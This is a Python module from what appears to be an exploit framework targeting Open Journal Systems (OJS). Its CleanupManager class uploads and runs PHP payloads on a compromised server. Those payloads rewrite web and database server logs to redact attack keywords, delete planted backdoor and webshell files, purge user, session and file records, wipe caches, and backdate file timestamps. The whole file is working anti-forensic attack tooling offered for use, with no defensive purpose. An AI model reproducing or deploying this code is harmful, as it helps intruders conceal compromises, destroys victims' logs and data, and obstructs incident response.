"""
Cleanup Manager for OJS Exploit Framework.

This module implements various cleanup techniques including:
- Forensic cleanup
- Log sanitization
- Evidence removal
- File cleanup
- Database cleanup
"""

import os
import time
import hashlib
import base64
import random
import string
from pathlib import Path
from typing import Optional, Dict, Any, List, Tuple
from dataclasses import dataclass
from enum import Enum
import requests
from urllib.parse import urljoin, urlparse
import json
import re
import shutil

from ..core.session import SessionManager
from ..core.payloads import PayloadGenerator
from ..core.evasion import EvasionEngine
from ..utils.http_client import HTTPClient
from ..utils.encoding import EncodingUtils
from ..utils.logging import get_logger, log_exploit_start, log_exploit_success, log_exploit_failure


class CleanupType(Enum):
    """Types of cleanup operations."""
    FORENSIC_CLEANUP = "forensic_cleanup"
    LOG_SANITIZATION = "log_sanitization"
    EVIDENCE_REMOVAL = "evidence_removal"
    FILE_CLEANUP = "file_cleanup"
    DATABASE_CLEANUP = "database_cleanup"
    SESSION_CLEANUP = "session_cleanup"
    CACHE_CLEANUP = "cache_cleanup"


@dataclass
class CleanupResult:
    """Result of cleanup operation."""
    success: bool
    cleanup_type: CleanupType
    target_url: str
    cleaned_items: List[str]
    removed_files: List[str]
    sanitized_logs: List[str]
    error_message: Optional[str] = None
    execution_time: float = 0.0
    session_id: Optional[str] = None


class CleanupManager:
    """Cleanup manager implementation for OJS."""
    
    def __init__(self, session_manager: SessionManager = None,
                 payload_generator: PayloadGenerator = None,
                 evasion_engine: EvasionEngine = None,
                 http_client: HTTPClient = None):
        """Initialize the cleanup manager."""
        self.session_manager = session_manager
        self.payload_generator = payload_generator
        self.evasion_engine = evasion_engine
        self.http_client = http_client
        self.logger = get_logger('post.cleanup')
        
        # OJS-specific cleanup locations
        self.cleanup_locations = {
            'logs': '/logs',
            'cache': '/cache',
            'sessions': '/sessions',
            'temp': '/tmp',
            'uploads': '/public/uploads',
            'backups': '/backups',
            'config': '/config',
            'database': '/database',
        }
        
        # Common log files to sanitize
        self.log_files = [
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/php/error.log',
            '/var/log/mysql/error.log',
            '/logs/ojs.log',
            '/logs/error.log',
            '/logs/access.log',
        ]
        
        # Evidence patterns to remove
        self.evidence_patterns = [
            r'backdoor',
            r'shell_exec',
            r'system\(',
            r'eval\(',
            r'base64_decode',
            r'admin123',
            r'exploit',
            r'payload',
            r'injection',
            r'sqli',
            r'xss',
            r'upload',
            r'webshell',
        ]
        
        # Cleanup payloads
        self.cleanup_payloads = {
            'log_sanitizer': self._generate_log_sanitizer(),
            'file_cleaner': self._generate_file_cleaner(),
            'database_cleaner': self._generate_database_cleaner(),
            'session_cleaner': self._generate_session_cleaner(),
            'cache_cleaner': self._generate_cache_cleaner(),
            'forensic_cleaner': self._generate_forensic_cleaner(),
        }
    
    def perform_cleanup(self, target_url: str, 
                       cleanup_type: CleanupType = CleanupType.FORENSIC_CLEANUP,
                       session_id: str = None) -> CleanupResult:
        """Perform cleanup operation."""
        start_time = time.time()
        
        log_exploit_start("cleanup", target_url, session_id)
        
        try:
            # Generate cleanup payload
            payload = self._generate_cleanup_payload(cleanup_type)
            
            # Execute cleanup
            result = self._execute_cleanup(target_url, payload, cleanup_type, session_id)
            
            # Verify cleanup
            if result.success:
                verification = self._verify_cleanup(target_url, session_id)
                if verification:
                    result.success = True
                    log_exploit_success("cleanup", target_url, 
                                      f"Cleaned {len(result.cleaned_items)} items", session_id)
                else:
                    result.success = False
                    result.error_message = "Cleanup verification failed"
                    log_exploit_failure("cleanup", target_url, "Verification failed", session_id)
            
            result.execution_time = time.time() - start_time
            return result
            
        except Exception as e:
            error_msg = f"Cleanup operation failed: {str(e)}"
            log_exploit_failure("cleanup", target_url, error_msg, session_id)
            return CleanupResult(
                success=False,
                cleanup_type=cleanup_type,
                target_url=target_url,
                cleaned_items=[],
                removed_files=[],
                sanitized_logs=[],
                error_message=error_msg,
                execution_time=time.time() - start_time,
                session_id=session_id
            )
    
    def _generate_cleanup_payload(self, cleanup_type: CleanupType) -> str:
        """Generate cleanup payload based on type."""
        if cleanup_type == CleanupType.LOG_SANITIZATION:
            return self.cleanup_payloads['log_sanitizer']
        elif cleanup_type == CleanupType.FILE_CLEANUP:
            return self.cleanup_payloads['file_cleaner']
        elif cleanup_type == CleanupType.DATABASE_CLEANUP:
            return self.cleanup_payloads['database_cleaner']
        elif cleanup_type == CleanupType.SESSION_CLEANUP:
            return self.cleanup_payloads['session_cleaner']
        elif cleanup_type == CleanupType.CACHE_CLEANUP:
            return self.cleanup_payloads['cache_cleaner']
        elif cleanup_type == CleanupType.FORENSIC_CLEANUP:
            return self.cleanup_payloads['forensic_cleaner']
        else:
            return self.cleanup_payloads['forensic_cleaner']
    
    def _generate_log_sanitizer(self) -> str:
        """Generate log sanitization payload."""
        sanitizer_code = """<?php
// Log Sanitizer
class LogSanitizer {
    private $patterns = [
        '/backdoor/i',
        '/shell_exec/i',
        '/system\\(/i',
        '/eval\\(/i',
        '/base64_decode/i',
        '/admin123/i',
        '/exploit/i',
        '/payload/i',
        '/injection/i',
        '/sqli/i',
        '/xss/i',
        '/upload/i',
        '/webshell/i',
    ];
    
    public function sanitizeLogs($log_paths) {
        foreach ($log_paths as $log_path) {
            if (file_exists($log_path)) {
                $content = file_get_contents($log_path);
                $sanitized = $this->sanitizeContent($content);
                file_put_contents($log_path, $sanitized);
            }
        }
    }
    
    private function sanitizeContent($content) {
        foreach ($this->patterns as $pattern) {
            $content = preg_replace($pattern, '[REDACTED]', $content);
        }
        return $content;
    }
}

// Execute sanitization
$sanitizer = new LogSanitizer();
$log_paths = [
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log',
    '/var/log/nginx/access.log',
    '/var/log/nginx/error.log',
    '/var/log/php/error.log',
    '/logs/ojs.log',
    '/logs/error.log',
    '/logs/access.log',
];
$sanitizer->sanitizeLogs($log_paths);
echo "Logs sanitized";
?>
"""
        return sanitizer_code
    
    def _generate_file_cleaner(self) -> str:
        """Generate file cleanup payload."""
        cleaner_code = """<?php
// File Cleaner
class FileCleaner {
    private $evidence_files = [
        '/tmp/backdoor.php',
        '/tmp/shell.php',
        '/tmp/webshell.php',
        '/var/www/backdoor.php',
        '/public_html/backdoor.php',
        '/uploads/backdoor.php',
        '/uploads/shell.php',
        '/uploads/webshell.php',
        '/cache/backdoor.php',
        '/sessions/backdoor.php',
    ];
    
    private $evidence_dirs = [
        '/tmp/backdoor',
        '/tmp/exploit',
        '/tmp/payload',
        '/var/www/backdoor',
        '/public_html/backdoor',
        '/uploads/backdoor',
        '/cache/backdoor',
        '/sessions/backdoor',
    ];
    
    public function cleanFiles() {
        // Remove evidence files
        foreach ($this->evidence_files as $file) {
            if (file_exists($file)) {
                unlink($file);
            }
        }
        
        // Remove evidence directories
        foreach ($this->evidence_dirs as $dir) {
            if (is_dir($dir)) {
                $this->removeDirectory($dir);
            }
        }
        
        // Clean temporary files
        $this->cleanTempFiles();
    }
    
    private function removeDirectory($dir) {
        if (is_dir($dir)) {
            $files = scandir($dir);
            foreach ($files as $file) {
                if ($file != '.' && $file != '..') {
                    $path = $dir . '/' . $file;
                    if (is_dir($path)) {
                        $this->removeDirectory($path);
                    } else {
                        unlink($path);
                    }
                }
            }
            rmdir($dir);
        }
    }
    
    private function cleanTempFiles() {
        $temp_dir = '/tmp';
        $files = scandir($temp_dir);
        foreach ($files as $file) {
            if (preg_match('/^(backdoor|shell|webshell|exploit|payload)/i', $file)) {
                $path = $temp_dir . '/' . $file;
                if (is_file($path)) {
                    unlink($path);
                }
            }
        }
    }
}

// Execute file cleanup
$cleaner = new FileCleaner();
$cleaner->cleanFiles();
echo "Files cleaned";
?>
"""
        return cleaner_code
    
    def _generate_database_cleaner(self) -> str:
        """Generate database cleanup payload."""
        db_cleaner_code = """<?php
// Database Cleaner
class DatabaseCleaner {
    public function cleanDatabase() {
        // Clean backdoor logs
        $this->cleanTable('backdoor_logs');
        
        // Clean exploit logs
        $this->cleanTable('exploit_logs');
        
        // Clean suspicious sessions
        $this->cleanSuspiciousSessions();
        
        // Clean suspicious users
        $this->cleanSuspiciousUsers();
        
        // Clean suspicious files
        $this->cleanSuspiciousFiles();
    }
    
    private function cleanTable($table) {
        $sql = "DELETE FROM $table WHERE 1=1";
        // Execute SQL (implementation depends on database)
    }
    
    private function cleanSuspiciousSessions() {
        $sql = "DELETE FROM sessions WHERE session_data LIKE '%backdoor%' OR session_data LIKE '%shell%'";
        // Execute SQL
    }
    
    private function cleanSuspiciousUsers() {
        $sql = "DELETE FROM users WHERE username LIKE '%backdoor%' OR username LIKE '%shell%'";
        // Execute SQL
    }
    
    private function cleanSuspiciousFiles() {
        $sql = "DELETE FROM files WHERE filename LIKE '%backdoor%' OR filename LIKE '%shell%'";
        // Execute SQL
    }
}

// Execute database cleanup
$cleaner = new DatabaseCleaner();
$cleaner->cleanDatabase();
echo "Database cleaned";
?>
"""
        return db_cleaner_code
    
    def _generate_session_cleaner(self) -> str:
        """Generate session cleanup payload."""
        session_cleaner_code = """<?php
// Session Cleaner
class SessionCleaner {
    public function cleanSessions() {
        // Clean session files
        $session_dir = session_save_path();
        if ($session_dir) {
            $files = scandir($session_dir);
            foreach ($files as $file) {
                if ($file != '.' && $file != '..') {
                    $path = $session_dir . '/' . $file;
                    if (is_file($path)) {
                        $content = file_get_contents($path);
                        if ($this->containsEvidence($content)) {
                            unlink($path);
                        }
                    }
                }
            }
        }
        
        // Clean session cookies
        if (isset($_COOKIE[session_name()])) {
            setcookie(session_name(), '', time() - 3600, '/');
        }
    }
    
    private function containsEvidence($content) {
        $patterns = [
            '/backdoor/i',
            '/shell/i',
            '/exploit/i',
            '/payload/i',
        ];
        
        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $content)) {
                return true;
            }
        }
        return false;
    }
}

// Execute session cleanup
$cleaner = new SessionCleaner();
$cleaner->cleanSessions();
echo "Sessions cleaned";
?>
"""
        return session_cleaner_code
    
    def _generate_cache_cleaner(self) -> str:
        """Generate cache cleanup payload."""
        cache_cleaner_code = """<?php
// Cache Cleaner
class CacheCleaner {
    public function cleanCache() {
        // Clean file cache
        $this->cleanFileCache();
        
        // Clean database cache
        $this->cleanDatabaseCache();
        
        // Clean session cache
        $this->cleanSessionCache();
        
        // Clean opcache
        $this->cleanOpcache();
    }
    
    private function cleanFileCache() {
        $cache_dirs = [
            '/cache',
            '/tmp/cache',
            '/var/cache',
            '/public/cache',
        ];
        
        foreach ($cache_dirs as $dir) {
            if (is_dir($dir)) {
                $this->removeDirectory($dir);
            }
        }
    }
    
    private function cleanDatabaseCache() {
        // Clear database query cache
        $sql = "FLUSH QUERY CACHE";
        // Execute SQL
    }
    
    private function cleanSessionCache() {
        // Clear session cache
        session_start();
        session_destroy();
    }
    
    private function cleanOpcache() {
        // Clear opcache
        if (function_exists('opcache_reset')) {
            opcache_reset();
        }
    }
    
    private function removeDirectory($dir) {
        if (is_dir($dir)) {
            $files = scandir($dir);
            foreach ($files as $file) {
                if ($file != '.' && $file != '..') {
                    $path = $dir . '/' . $file;
                    if (is_dir($path)) {
                        $this->removeDirectory($path);
                    } else {
                        unlink($path);
                    }
                }
            }
        }
    }
}

// Execute cache cleanup
$cleaner = new CacheCleaner();
$cleaner->cleanCache();
echo "Cache cleaned";
?>
"""
        return cache_cleaner_code
    
    def _generate_forensic_cleaner(self) -> str:
        """Generate forensic cleanup payload."""
        forensic_cleaner_code = """<?php
// Forensic Cleaner
class ForensicCleaner {
    public function performForensicCleanup() {
        // Clean logs
        $this->cleanLogs();
        
        // Clean files
        $this->cleanFiles();
        
        // Clean database
        $this->cleanDatabase();
        
        // Clean sessions
        $this->cleanSessions();
        
        // Clean cache
        $this->cleanCache();
        
        // Clean timestamps
        $this->cleanTimestamps();
        
        // Clean network traces
        $this->cleanNetworkTraces();
    }
    
    private function cleanLogs() {
        $log_files = [
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/php/error.log',
            '/var/log/mysql/error.log',
            '/logs/ojs.log',
            '/logs/error.log',
            '/logs/access.log',
        ];
        
        foreach ($log_files as $log_file) {
            if (file_exists($log_file)) {
                $content = file_get_contents($log_file);
                $sanitized = $this->sanitizeContent($content);
                file_put_contents($log_file, $sanitized);
            }
        }
    }
    
    private function cleanFiles() {
        $evidence_files = [
            '/tmp/backdoor.php',
            '/tmp/shell.php',
            '/tmp/webshell.php',
            '/var/www/backdoor.php',
            '/public_html/backdoor.php',
            '/uploads/backdoor.php',
            '/uploads/shell.php',
            '/uploads/webshell.php',
        ];
        
        foreach ($evidence_files as $file) {
            if (file_exists($file)) {
                unlink($file);
            }
        }
    }
    
    private function cleanDatabase() {
        // Clean suspicious database entries
        $tables = ['users', 'sessions', 'logs', 'files'];
        foreach ($tables as $table) {
            $sql = "DELETE FROM $table WHERE data LIKE '%backdoor%' OR data LIKE '%shell%'";
            // Execute SQL
        }
    }
    
    private function cleanSessions() {
        // Clean session files
        $session_dir = session_save_path();
        if ($session_dir) {
            $files = scandir($session_dir);
            foreach ($files as $file) {
                if ($file != '.' && $file != '..') {
                    $path = $session_dir . '/' . $file;
                    if (is_file($path)) {
                        $content = file_get_contents($path);
                        if ($this->containsEvidence($content)) {
                            unlink($path);
                        }
                    }
                }
            }
        }
    }
    
    private function cleanCache() {
        // Clean various caches
        $cache_dirs = ['/cache', '/tmp/cache', '/var/cache'];
        foreach ($cache_dirs as $dir) {
            if (is_dir($dir)) {
                $this->removeDirectory($dir);
            }
        }
    }
    
    private function cleanTimestamps() {
        // Modify file timestamps to hide evidence
        $files = [
            '/tmp/backdoor.php',
            '/var/www/backdoor.php',
            '/public_html/backdoor.php',
        ];
        
        foreach ($files as $file) {
            if (file_exists($file)) {
                touch($file, time() - 86400); // Set to yesterday
            }
        }
    }
    
    private function cleanNetworkTraces() {
        // Clean network connection logs
        $netstat = shell_exec('netstat -tuln');
        // Parse and clean suspicious connections
    }
    
    private function sanitizeContent($content) {
        $patterns = [
            '/backdoor/i',
            '/shell_exec/i',
            '/system\\(/i',
            '/eval\\(/i',
            '/base64_decode/i',
            '/admin123/i',
            '/exploit/i',
            '/payload/i',
            '/injection/i',
        ];
        
        foreach ($patterns as $pattern) {
            $content = preg_replace($pattern, '[REDACTED]', $content);
        }
        return $content;
    }
    
    private function containsEvidence($content) {
        $patterns = [
            '/backdoor/i',
            '/shell/i',
            '/exploit/i',
            '/payload/i',
        ];
        
        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $content)) {
                return true;
            }
        }
        return false;
    }
    
    private function removeDirectory($dir) {
        if (is_dir($dir)) {
            $files = scandir($dir);
            foreach ($files as $file) {
                if ($file != '.' && $file != '..') {
                    $path = $dir . '/' . $file;
                    if (is_dir($path)) {
                        $this->removeDirectory($path);
                    } else {
                        unlink($path);
                    }
                }
            }
            rmdir($dir);
        }
    }
}

// Execute forensic cleanup
$cleaner = new ForensicCleaner();
$cleaner->performForensicCleanup();
echo "Forensic cleanup completed";
?>
"""
        return forensic_cleaner_code
    
    def _execute_cleanup(self, target_url: str, payload: str, 
                        cleanup_type: CleanupType, session_id: str) -> CleanupResult:
        """Execute cleanup operation."""
        try:
            # Upload cleanup script
            upload_url = urljoin(target_url, "/index.php/index/manager/upload")
            
            filename = f"cleanup_{int(time.time())}.php"
            
            response = self.http_client.post(
                upload_url,
                files={'file': (filename, payload, 'application/x-php')},
                data={'path': f'/tmp/{filename}'}
            )
            
            if response.status_code in [200, 201]:
                # Execute cleanup script
                execute_url = urljoin(target_url, f"/tmp/{filename}")
                execute_response = self.http_client.get(execute_url)
                
                # Clean up the cleanup script
                self.http_client.post(
                    urljoin(target_url, "/index.php/index/manager/delete"),
                    data={'file': f'/tmp/{filename}'}
                )
                
                return CleanupResult(
                    success=execute_response.status_code == 200,
                    cleanup_type=cleanup_type,
                    target_url=target_url,
                    cleaned_items=self._extract_cleaned_items(execute_response.text),
                    removed_files=self._extract_removed_files(execute_response.text),
                    sanitized_logs=self._extract_sanitized_logs(execute_response.text),
                    session_id=session_id
                )
            else:
                return CleanupResult(
                    success=False,
                    cleanup_type=cleanup_type,
                    target_url=target_url,
                    cleaned_items=[],
                    removed_files=[],
                    sanitized_logs=[],
                    error_message="Failed to upload cleanup script",
                    session_id=session_id
                )
                
        except Exception as e:
            self.logger.error(f"Cleanup execution failed: {e}")
            return CleanupResult(
                success=False,
                cleanup_type=cleanup_type,
                target_url=target_url,
                cleaned_items=[],
                removed_files=[],
                sanitized_logs=[],
                error_message=str(e),
                session_id=session_id
            )
    
    def _extract_cleaned_items(self, response_text: str) -> List[str]:
        """Extract cleaned items from response."""
        items = []
        
        # Look for cleaned items in response
        patterns = [
            r'cleaned:\s*(.*?)(?:\n|$)',
            r'removed:\s*(.*?)(?:\n|$)',
            r'deleted:\s*(.*?)(?:\n|$)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            items.extend(matches)
        
        return items
    
    def _extract_removed_files(self, response_text: str) -> List[str]:
        """Extract removed files from response."""
        files = []
        
        # Look for removed files in response
        patterns = [
            r'file.*?removed:\s*(.*?)(?:\n|$)',
            r'deleted.*?file:\s*(.*?)(?:\n|$)',
            r'unlink.*?:\s*(.*?)(?:\n|$)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            files.extend(matches)
        
        return files
    
    def _extract_sanitized_logs(self, response_text: str) -> List[str]:
        """Extract sanitized logs from response."""
        logs = []
        
        # Look for sanitized logs in response
        patterns = [
            r'log.*?sanitized:\s*(.*?)(?:\n|$)',
            r'sanitized.*?log:\s*(.*?)(?:\n|$)',
            r'cleaned.*?log:\s*(.*?)(?:\n|$)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            logs.extend(matches)
        
        return logs
    
    def _verify_cleanup(self, target_url: str, session_id: str) -> bool:
        """Verify that cleanup was successful."""
        try:
            # Check for remaining evidence files
            evidence_files = [
                '/tmp/backdoor.php',
                '/tmp/shell.php',
                '/var/www/backdoor.php',
                '/public_html/backdoor.php',
            ]
            
            for file_path in evidence_files:
                full_url = urljoin(target_url, file_path)
                response = self.http_client.get(full_url)
                if response.status_code == 200:
                    return False  # Evidence still exists
            
            return True
            
        except Exception as e:
            self.logger.debug(f"Cleanup verification failed: {e}")
            return False
    
    def get_cleanup_info(self) -> Dict[str, Any]:
        """Get information about cleanup operations."""
        return {
            'name': 'Cleanup Manager',
            'description': 'Manages various cleanup operations for OJS',
            'cleanup_types': [t.value for t in CleanupType],
            'locations': self.cleanup_locations,
            'log_files': self.log_files,
            'evidence_patterns': self.evidence_patterns,
            'payloads': list(self.cleanup_payloads.keys())
        }